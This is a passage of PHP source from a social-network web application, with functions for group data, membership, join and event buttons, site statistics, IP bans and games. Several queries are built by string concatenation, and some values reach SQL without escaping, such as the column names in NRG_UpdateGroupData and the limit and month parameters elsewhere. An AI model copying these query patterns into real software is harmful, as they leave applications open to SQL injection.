    if ($nrg['config']['cacheSystem'] == 1) {
        $fetched_data = cache($group_id, 'groups', 'read');
        if (empty($fetched_data)) {
            $generateCache = true;
            $sql = mysqli_query($sqlConnect, $query_one);
            if (mysqli_num_rows($sql)) {
                $fetched_data = mysqli_fetch_assoc($sql);
            }
        } else {
            return $fetched_data;
        }
    } else {
        $sql = mysqli_query($sqlConnect, $query_one);
        if (mysqli_num_rows($sql)) {
            $fetched_data = mysqli_fetch_assoc($sql);
        }
    }
    if (empty($fetched_data)) {
        return array();
    }
    $fetched_data["group_id"]           = $fetched_data["id"];
    $fetched_data["avatar"]             = NRG_GetMedia($fetched_data["avatar"]);
    $fetched_data["cover"]              = NRG_GetMedia($fetched_data["cover"]);
    $fetched_data["url"]                = NRG_SeoLink("index.php?link1=timeline&u=" . $fetched_data["group_name"]);
    $fetched_data["name"]               = $fetched_data["group_title"];
    $fetched_data["category_id"]        = $fetched_data["category"];
    $fetched_data["type"]               = "group";
    $fetched_data["username"]           = $fetched_data["group_name"];
    $fetched_data["category"]           = $nrg["group_categories"][$fetched_data["category"]];
    $fetched_data["is_reported"]        = NRG_IsReportExists($fetched_data["id"], "group");
    $fetched_data["group_sub_category"] = "";
    if (!empty($fetched_data["sub_category"]) && !empty($nrg["group_sub_categories"][$fetched_data["category_id"]])) {
        foreach ($nrg["group_sub_categories"][$fetched_data["category_id"]] as $key => $value) {
            if ($value["id"] == $fetched_data["sub_category"]) {
                $fetched_data["group_sub_category"] = $value["lang"];
            }
        }
    }
    $fetched_data["fields"] = array();
    $fields                 = NRG_GetCustomFields("group");
    if (!empty($fields)) {
        foreach ($fields as $key => $field) {
            if (in_array($field["fid"], array_keys($fetched_data))) {
                $fetched_data["fields"][$field["fid"]] = $fetched_data[$field["fid"]];
            }
        }
    }
    if (NRG_IsJoinRequested($fetched_data["group_id"])) {
        $fetched_data["is_group_joined"] = 2;
    } elseif (NRG_IsGroupJoined($fetched_data["group_id"])) {
        $fetched_data["is_group_joined"] = 1;
    } else {
        $fetched_data["is_group_joined"] = 0;
    }
    $fetched_data["members_count"] = NRG_CountGroupMembers($fetched_data["group_id"]);
    if ($generateCache === true) {
        cache($group_id, 'groups', 'write', $fetched_data);
    }
    return $fetched_data;
}
function NRG_GroupActive($group_name) {
    global $sqlConnect;
    if (empty($group_name)) {
        return false;
    }
    $group_name = NRG_Secure($group_name);
    $query      = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_GROUPS . "  WHERE `group_name` = '{$group_name}' AND `active` = '1'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_CanBeOnGroup($group_id) {
    global $sqlConnect;
    if (empty($group_id)) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    if (NRG_IsGroupOnwer($group_id)) {
        return true;
    }
    $group = NRG_GroupData($group_id);
    if (empty($group)) {
        return false;
    }
    if ($group["privacy"] == 2) {
        if (NRG_IsGroupJoined($group_id) === true) {
            return true;
        }
    } elseif ($group["privacy"] == 1) {
        return true;
    } else {
        return false;
    }
}
function NRG_GetGroupPostPublisherBox($group_id = 0) {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!is_numeric($group_id) or $group_id < 1 or !is_numeric($group_id)) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $continue = false;
    if (NRG_CanBeOnGroup($group_id) === true) {
        $group = NRG_GroupData($group_id);
        if ($group["privacy"] == 2) {
            if (NRG_IsGroupJoined($group_id) === true) {
                $continue = true;
            }
        } elseif ($group["privacy"] == 1) {
            //if (NRG_IsGroupJoined($group_id) === true) {
            $continue = true;
            //}
        } else {
            $continue = false;
        }
    }
    if ($continue == true) {
        return NRG_LoadPage("story/publisher-box");
    }
}
function NRG_GetJoinButton($group_id = 0) {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id) or $group_id < 0) {
        return false;
    }
    if (NRG_IsGroupOnwer($group_id)) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $group    = $nrg["join"] = NRG_GroupData($group_id);
    if (!isset($nrg["join"]["id"])) {
        return false;
    }
    $logged_user_id        = NRG_Secure($nrg["user"]["user_id"]);
    $join_button           = "buttons/join";
    $leave_button          = "buttons/leave";
    $accept_request_button = "buttons/join-requested";
    if (NRG_IsGroupJoined($group_id, $logged_user_id) === true) {
        return NRG_LoadPage($leave_button);
    } else {
        if (NRG_IsJoinRequested($group_id) === true) {
            return NRG_LoadPage($accept_request_button);
        } else {
            return NRG_LoadPage($join_button);
        }
    }
}
function NRG_GetGoingButton($event_id = 0) {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($event_id) || !is_numeric($event_id) or $event_id < 0) {
        return false;
    }
    if (Is_EventOwner($event_id, false, false)) {
        return false;
    }
    $event_id = NRG_Secure($event_id);
    $event    = $nrg["going"] = NRG_EventData($event_id);
    if (!isset($nrg["going"]["id"])) {
        return false;
    }
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $going          = "buttons/going";
    $no_going       = "buttons/no-going";
    if (NRG_EventGoingExists($event_id) === true) {
        return NRG_LoadPage($no_going);
    } else {
        return NRG_LoadPage($going);
    }
}
function NRG_GetInterestedButton($event_id = 0) {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($event_id) || !is_numeric($event_id) or $event_id < 0) {
        return false;
    }
    if (Is_EventOwner($event_id, false, false)) {
        return false;
    }
    $event_id = NRG_Secure($event_id);
    $event    = $nrg["interested"] = NRG_EventData($event_id);
    if (!isset($nrg["interested"]["id"])) {
        return false;
    }
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $interested     = "buttons/interested";
    $no_interested  = "buttons/no-interested";
    if (NRG_EventInterestedExists($event_id) === true) {
        return NRG_LoadPage($no_interested);
    } else {
        return NRG_LoadPage($interested);
    }
}
function NRG_IsGroupJoined($group_id = 0, $user_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id) || $group_id < 0) {
        return false;
    }
    $user_id = NRG_Secure($user_id);
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        $user_id = NRG_Secure($nrg["user"]["user_id"]);
    }
    $group_id  = NRG_Secure($group_id);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_GROUP_MEMBERS . " WHERE `user_id` = '{$user_id}' AND `group_id` = {$group_id} AND `active` = '1'");
    return NRG_Sql_Result($query_one, 0) == 1 ? true : false;
}
function NRG_IsJoinRequested($group_id = 0, $user_id = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($user_id);
    if (!isset($user_id) or empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        $user_id = NRG_Secure($nrg["user"]["user_id"]);
    }
    if (!is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id  = NRG_Secure($group_id);
    $query     = "SELECT `id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `user_id` = {$user_id} AND `active` = '0'";
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query) > 0) {
        return true;
    }
}
function NRG_RegisterGroupJoin($group_id = 0, $user_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($group_id) or empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    if (!isset($user_id) or empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $group_id    = NRG_Secure($group_id);
    $user_id     = NRG_Secure($user_id);
    $group_onwer = NRG_GetUserIdFromGroupId($group_id);
    $active      = 1;
    if (NRG_IsGroupJoined($group_id, $user_id) === true) {
        return false;
    }
    $group_data = NRG_GroupData($group_id);
    if ($group_data["join_privacy"] == 2) {
        $active = 0;
    }
    $query = mysqli_query($sqlConnect, " INSERT INTO " . T_GROUP_MEMBERS . " (`user_id`,`group_id`,`active`,`time`) VALUES ({$user_id},{$group_id},'{$active}'," . time() . ")");
    if ($query) {
        cache($group_id, 'groups', 'delete');
        cache($user_id, 'users', 'delete');
        if ($active == 1) {
            $notification_data = array(
                "recipient_id" => $group_onwer,
                "notifier_id" => $user_id,
                "type" => "joined_group",
                "group_id" => $group_id,
                "url" => "index.php?link1=timeline&u=" . $group_data["group_name"]
            );
            NRG_RegisterNotification($notification_data);
        } elseif ($active == 0) {
            $notification_data = array(
                "recipient_id" => $group_onwer,
                "notifier_id" => $user_id,
                "type" => "requested_to_join_group",
                "group_id" => $group_id,
                "url" => "index.php?link1=group-setting&group=" . $group_data["group_name"] . "&link3=requests"
            );
            NRG_RegisterNotification($notification_data);
        }
    }
    return true;
}
function NRG_LeaveGroup($group_id = 0, $user_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($group_id) or empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    if (!isset($user_id) or empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $user_id  = NRG_Secure($user_id);
    $active   = 1;
    if (NRG_IsGroupJoined($group_id, $user_id) === false && NRG_IsJoinRequested($group_id, $user_id) === false) {
        return false;
    }
    $query = mysqli_query($sqlConnect, " DELETE FROM " . T_GROUP_MEMBERS . " WHERE `user_id` = {$user_id} AND `group_id` = '{$group_id}'");
    if ($query) {
        cache($group_id, 'groups', 'delete');
        cache($user_id, 'users', 'delete');
        @mysqli_query($sqlConnect, "DELETE FROM " . T_GROUP_ADMINS . " WHERE `user_id` = {$user_id} AND `group_id` = {$group_id}");
        return true;
    }
}
function NRG_UpdateGroupData($group_id = 0, $update_data = array()) {
    global $nrg, $sqlConnect, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id) || $group_id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    if (NRG_IsAdmin() === false && NRG_IsModerator() === false) {
        if (NRG_IsGroupOnwer($group_id) === false) {
            return false;
        }
    }
    if (!empty($update_data["category"])) {
        if (!array_key_exists($update_data["category"], $nrg["group_categories"])) {
            $update_data["category"] = 1;
        }
    }
    $update = array();
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . NRG_Secure($data, 1) . '\'';
    }
    $impload   = implode(", ", $update);
    $query_one = " UPDATE " . T_GROUPS . " SET {$impload} WHERE `id` = {$group_id} ";
    $query     = mysqli_query($sqlConnect, $query_one);
    cache($group_id, 'groups', 'delete');
    if ($query) {
        return true;
    } else {
        return false;
    }
}
function NRG_GetGroupIdFromPostId($post_id = 0) {
    global $sqlConnect;
    if (empty($post_id) or !is_numeric($post_id) or $post_id < 1) {
        return false;
    }
    $post_id       = NRG_Secure($post_id);
    $query_one     = "SELECT `group_id` FROM " . T_POSTS . " WHERE `id` = {$post_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["group_id"];
    }
    return false;
}
function NRG_GetUserIdFromGroupId($group_id = 0) {
    global $sqlConnect;
    if (empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id      = NRG_Secure($group_id);
    $query_one     = "SELECT `user_id` FROM " . T_GROUPS . " WHERE `id` = {$group_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["user_id"];
    }
    return false;
}
function NRG_DeleteGroup($group_id = 0) {
    global $nrg, $sqlConnect, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id) || $group_id < 1) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    if (NRG_IsAdmin() === false && NRG_IsModerator() === false) {
        if (NRG_IsGroupOnwer($group_id) === false) {
            return false;
        }
    }
    $query_one_delete_photos = mysqli_query($sqlConnect, " SELECT `avatar`,`cover` FROM " . T_GROUPS . " WHERE `id` = {$group_id}");
    if (mysqli_num_rows($query_one_delete_photos)) {
        $fetched_data = mysqli_fetch_assoc($query_one_delete_photos);
        if (isset($fetched_data["avatar"]) && !empty($fetched_data["avatar"]) && $fetched_data["avatar"] != $nrg["groupDefaultAvatar"]) {
            @unlink($fetched_data["avatar"]);
        }
        if (isset($fetched_data["cover"]) && !empty($fetched_data["cover"]) && $fetched_data["cover"] != $nrg["userDefaultCover"]) {
            @unlink($fetched_data["cover"]);
        }
    }
    $query_two_delete_media = mysqli_query($sqlConnect, " SELECT `postFile` FROM " . T_POSTS . " WHERE `group_id` = {$group_id}");
    if (mysqli_num_rows($query_two_delete_media) > 0) {
        while ($fetched_data = mysqli_fetch_assoc($query_two_delete_media)) {
            if (isset($fetched_data["postFile"]) && !empty($fetched_data["postFile"])) {
                @unlink($fetched_data["postFile"]);
            }
        }
    }
    $query_four_delete_media = mysqli_query($sqlConnect, "SELECT `id`,`post_id` FROM " . T_POSTS . " WHERE `group_id` = {$group_id}");
    if (mysqli_num_rows($query_four_delete_media) > 0) {
        while ($fetched_data = mysqli_fetch_assoc($query_four_delete_media)) {
            $delete_posts = NRG_DeletePost($fetched_data["id"]);
            $delete_posts = NRG_DeletePost($fetched_data["post_id"]);
        }
    }
    if ($nrg["config"]["cacheSystem"] == 1) {
        $cache->delete(md5($user_id) . "_GROUP_Data.tmp");
        $query_two = mysqli_query($sqlConnect, "SELECT `id`,`post_id` FROM " . T_POSTS . " WHERE `group_id` = {$group_id}");
        if (mysqli_num_rows($query_two) > 0) {
            while ($fetched_data_two = mysqli_fetch_assoc($query_two)) {
                $cache->delete(md5($fetched_data_two["id"]) . "_GROUP_Data.tmp");
                $cache->delete(md5($fetched_data_two["post_id"]) . "_GROUP_Data.tmp");
            }
        }
    }
    $query_one = mysqli_query($sqlConnect, "DELETE FROM " . T_GROUPS . " WHERE `id` = {$group_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_NOTIFICATION . " WHERE `group_id` = {$group_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_GROUP_ADMINS . " WHERE `group_id` = {$group_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_POSTS . " WHERE `group_id` = {$group_id}");
    cache($group_id, 'groups', 'delete');
    if ($query_one) {
        return true;
    }
}
function NRG_CountGroupMembers($group_id = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $query    = mysqli_query($sqlConnect, "SELECT COUNT(`group_id`) AS count FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `active` = '1' ");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountGroupPosts($group_id = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $query    = mysqli_query($sqlConnect, "SELECT COUNT(`id`) AS count FROM " . T_POSTS . " WHERE `group_id` = {$group_id}");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountJoinedThisWeek($group_id = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    $time = strtotime("-1 week");
    if (empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $query    = mysqli_query($sqlConnect, "SELECT COUNT(`group_id`) AS count FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `active` = '1' AND (`time` between {$time} AND " . time() . ")");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_GroupSug($limit = 20) {
    global $nrg, $sqlConnect;
    if (!is_numeric($limit)) {
        return false;
    }
    $data      = array();
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    $query_one = " SELECT `id` FROM " . T_GROUPS . " WHERE `active` = '1' AND `id` NOT IN (SELECT `group_id` FROM " . T_GROUP_MEMBERS . " WHERE `user_id` = {$user_id}) AND `user_id` <> {$user_id}";
    if (isset($limit)) {
        $query_one .= " ORDER BY RAND() LIMIT {$limit}";
    }
    $sql = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $data[] = NRG_GroupData($fetched_data["id"]);
        }
    }
    return $data;
}
function NRG_GetGroupMembers($group_id = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $group_id  = NRG_Secure($group_id);
    $query     = " SELECT `user_id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `active` = '1'";
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query)) {
        while ($fetched_data = mysqli_fetch_assoc($sql_query)) {
            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function NRG_GetUsersGroups($user_id = 0, $limit = 12, $placement = array(), $offset = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $offset_text = "";
    if (!empty($offset) && is_numeric($offset) && $offset > 0) {
        $offset      = NRG_Secure($offset);
        $offset_text = " AND `group_id` > " . $offset;
    }
    $user_id = NRG_Secure($user_id);
    $query   = " SELECT `group_id` FROM " . T_GROUP_MEMBERS . " WHERE `user_id` = {$user_id} AND `active` = '1' {$offset_text} ORDER BY `id` LIMIT {$limit}";
    if (!empty($placement)) {
        if ($placement["in"] == "profile_sidebar" && is_array($placement["groups_data"])) {
            foreach ($placement["groups_data"] as $key => $id) {
                $user_data = NRG_GroupData($id);
                if (!empty($user_data)) {
                    $data[] = $user_data;
                }
            }
            return $data;
        }
    }
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query)) {
        while ($fetched_data = mysqli_fetch_assoc($sql_query)) {
            $data[] = NRG_GroupData($fetched_data["group_id"]);
        }
    }
    return $data;
}
function NRG_GetUsersGroupsAPI($user_id, $limit = 0, $offset = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $limit_query = "";
    if (!empty($limit)) {
        $limit       = NRG_Secure($limit);
        $limit_query = " LIMIT $limit";
    }
    $offset_query = "";
    if (!empty($offset)) {
        $offset       = NRG_Secure($offset);
        $offset_query = " AND `group_id` < $offset ";
    }
    $user_id   = NRG_Secure($user_id);
    $query     = " SELECT `group_id` FROM " . T_GROUP_MEMBERS . " WHERE `user_id` = {$user_id} AND `active` = '1' $offset_query  ORDER BY `group_id` DESC  $limit_query";
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query)) {
        while ($fetched_data = mysqli_fetch_assoc($sql_query)) {
            $data[] = NRG_GroupData($fetched_data["group_id"]);
        }
    }
    return $data;
}
function NRG_GetGroupSettingMembers($group_id = 0, $limit = 0, $offset = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($group_id) or !is_numeric($group_id) or $group_id < 1) {
        return false;
    }
    $limit_query = "";
    if (!empty($limit)) {
        $limit       = NRG_Secure($limit);
        $limit_query = " LIMIT $limit";
    }
    $offset_query = "";
    if (!empty($offset)) {
        $offset       = NRG_Secure($offset);
        $offset_query = " AND `id` > $offset ";
    }
    $group_id  = NRG_Secure($group_id);
    $query     = " SELECT `user_id`,`id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id} AND `active` = '1' $offset_query $limit_query";
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query)) {
        while ($fetched_data = mysqli_fetch_assoc($sql_query)) {
            $user_data              = NRG_UserData($fetched_data["user_id"]);
            $user_data["member_id"] = $fetched_data["id"];
            $data[]                 = $user_data;
        }
    }
    return $data;
}
function NRG_CountUserGroups($user_id) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $user_id = NRG_Secure($user_id);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`id`) AS count FROM " . T_GROUP_MEMBERS . " WHERE `user_id` = {$user_id} AND `active` = '1' ");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_GetAllGroups($limit = "", $after = "") {
    global $nrg, $sqlConnect;
    $data      = array();
    $query_one = " SELECT `id` FROM " . T_GROUPS;
    if (!empty($after) && is_numeric($after) && $after > 0) {
        $query_one .= " WHERE `id` < " . NRG_Secure($after);
    }
    $query_one .= " ORDER BY `id` DESC";
    if (isset($limit) and !empty($limit)) {
        $query_one .= " LIMIT {$limit}";
    }
    $sql = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $group_data            = NRG_GroupData($fetched_data["id"]);
            $group_data["members"] = NRG_CountGroupMembers($fetched_data["id"]);
            $group_data["owner"]   = NRG_UserData($group_data["user_id"]);
            $data[]                = $group_data;
        }
    }
    return $data;
}
function NRG_GetRegisteredDataStatics($month, $type = "user") {
    global $nrg, $sqlConnect;
    $year       = date("Y");
    $type_table = T_USERS;
    $type_id    = "user_id";
    if ($type == "user") {
        $type_table = T_USERS;
        $type_id    = "user_id";
    } elseif ($type == "page") {
        $type_table = T_PAGES;
        $type_id    = "page_id";
    } elseif ($type == "group") {
        $type_table = T_GROUPS;
        $type_id    = "id";
    } elseif ($type == "posts") {
        $type_table = T_POSTS;
        $type_id    = "id";
    }
    $type_id   = NRG_Secure($type_id);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT($type_id) as count FROM {$type_table} WHERE `registered` = '{$month}/{$year}'");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountAllData($type) {
    global $nrg, $sqlConnect;
    $type_table = T_USERS;
    $type_id    = "user_id";
    if ($type == "user") {
        $type_table = T_USERS;
        $type_id    = "user_id";
    } elseif ($type == "page") {
        $type_table = T_PAGES;
        $type_id    = "page_id";
    } elseif ($type == "group") {
        $type_table = T_GROUPS;
        $type_id    = "id";
    } elseif ($type == "posts") {
        $type_table = T_POSTS;
        $type_id    = "id";
    } elseif ($type == "comments") {
        $type_table = T_COMMENTS;
        $type_id    = "id";
    } elseif ($type == "games") {
        $type_table = T_GAMES;
        $type_id    = "id";
    } elseif ($type == "messages") {
        $type_table = T_MESSAGES;
        $type_id    = "id";
    }
    $type_id   = NRG_Secure($type_id);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT($type_id) as count FROM {$type_table}");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountOnlineData($type = "") {
    global $nrg, $sqlConnect;
    $data       = array();
    $type_table = T_USERS;
    $type_id    = NRG_Secure("user_id");
    $time       = time() - 60;
    $query_one  = mysqli_query($sqlConnect, "SELECT COUNT(`{$type_id}`) as count FROM {$type_table} WHERE `lastseen` > {$time}");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_GetAllOnlineData() {
    global $nrg, $sqlConnect;
    $data       = array();
    $type_table = T_USERS;
    $type_id    = NRG_Secure("user_id");
    $time       = time() - 60;
    $query_one  = mysqli_query($sqlConnect, "SELECT `user_id` FROM {$type_table} WHERE `lastseen` > {$time}");
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function NRG_GetAllProUsers() {
    global $nrg, $sqlConnect;
    $data       = array();
    $type_table = T_USERS;
    $type_id    = NRG_Secure("user_id");
    $query_one  = mysqli_query($sqlConnect, "SELECT `user_id` FROM {$type_table} WHERE `is_pro` = '1' ORDER BY `pro_time` ASC");
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function NRG_GetBanned($type = "", $userType = 1) {
    global $sqlConnect;
    $data  = array();
    $query = mysqli_query($sqlConnect, "SELECT * FROM " . T_BANNED_IPS . " ORDER BY id DESC");
    if (mysqli_num_rows($query)) {
        if ($type == "user") {
            while ($fetched_data = mysqli_fetch_assoc($query)) {
                if (filter_var($fetched_data["ip_address"], FILTER_VALIDATE_IP)) {
                    $data[] = $fetched_data["ip_address"];
                }
            }
        } else {
            while ($fetched_data = mysqli_fetch_assoc($query)) {
                $data[] = $fetched_data;
            }
        }
    }
    return $data;
}
function NRG_IsBanned($value = "") {
    global $sqlConnect;
    $value     = NRG_Secure($value);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM " . T_BANNED_IPS . " WHERE `ip_address` = '{$value}'");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        if ($fetched_data["count"] > 0) {
            return true;
        }
    }
    return false;
}
function NRG_BanNewIp($ip, $reason = "") {
    global $sqlConnect;
    $ip        = NRG_Secure($ip);
    $reason    = NRG_Secure($reason);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM " . T_BANNED_IPS . " WHERE `ip_address` = '{$ip}'");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        if ($fetched_data["count"] > 0) {
            return false;
        }
    }
    $time      = time();
    $query_two = mysqli_query($sqlConnect, "INSERT INTO " . T_BANNED_IPS . " (`ip_address`,`reason`,`time`) VALUES ('{$ip}','{$reason}','{$time}')");
    if ($query_two) {
        return true;
    }
}
function NRG_IsIpBanned($id) {
    global $sqlConnect;
    $id        = NRG_Secure($id);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM " . T_BANNED_IPS . " WHERE `id` = '{$id}'");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        if ($fetched_data["count"] > 0) {
            return true;
        } else {
            return false;
        }
    }
    return false;
}
function NRG_DeleteBanned($id) {
    global $sqlConnect;
    $id = NRG_Secure($id);
    if (NRG_IsIpBanned($id) === false) {
        return false;
    }
    $query_two = mysqli_query($sqlConnect, "DELETE FROM " . T_BANNED_IPS . " WHERE `id` = {$id}");
    if ($query_two) {
        return true;
    }
}
function NRG_GameExists($id) {
    global $sqlConnect;
    if (empty($id)) {
        return false;
    }
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_GAMES . " WHERE `id` = '{$id}'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_GameData($game_id) {
    global $nrg, $sqlConnect, $cache;
    if (empty($game_id) || !is_numeric($game_id) || $game_id < 1) {
        return false;
    }
    $data           = array();
    $game_id        = NRG_Secure($game_id);
    $query_one      = "SELECT * FROM " . T_GAMES . " WHERE `id` = {$game_id}";
    $hashed_game_id = md5($game_id);
    if ($nrg["config"]["cacheSystem"] == 1) {
        $fetched_data = $cache->read($hashed_game_id . "_GAME_Data.tmp");
        if (empty($fetched_data)) {
            $sql = mysqli_query($sqlConnect, $query_one);
            if (mysqli_num_rows($sql)) {
                $fetched_data = mysqli_fetch_assoc($sql);
                $cache->write($hashed_game_id . "_GAME_Data.tmp", $fetched_data);
            }
        }
    } else {
        $sql = mysqli_query($sqlConnect, $query_one);
        if (mysqli_num_rows($sql)) {
            $fetched_data = mysqli_fetch_assoc($sql);
        }
    }
    if (empty($fetched_data)) {
        return array();
    }
    $fetched_data["game_avatar"] = NRG_GetMedia($fetched_data["game_avatar"]);
    $fetched_data["url"]         = NRG_SeoLink("index.php?link1=game&id=" . $fetched_data["id"]);
    $fetched_data["name"]        = $fetched_data["game_name"];
    $fetched_data["last_play"]   = NRG_LastPlay($fetched_data["id"]);
    return $fetched_data;
}
function NRG_LastPlay($id) {
    global $nrg, $sqlConnect;
    $data = array();
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) or !is_numeric($id) or $id < 1) {
        return false;
    }
    $id      = NRG_Secure($id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query   = mysqli_query($sqlConnect, "SELECT `last_play` FROM " . T_GAMES_PLAYERS . " WHERE `game_id` = {$id} AND `user_id` = {$user_id} AND `active` = '1' ");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["last_play"];
    }
    return false;
}
function NRG_GetAllGames($limit = 5, $after = 0) {
    global $nrg, $sqlConnect;
    $data      = array();
    $query_one = " SELECT `id` FROM " . T_GAMES;
    if (!empty($after) && is_numeric($after) && $after > 0) {
        $query_one .= " WHERE `id` < " . NRG_Secure($after);
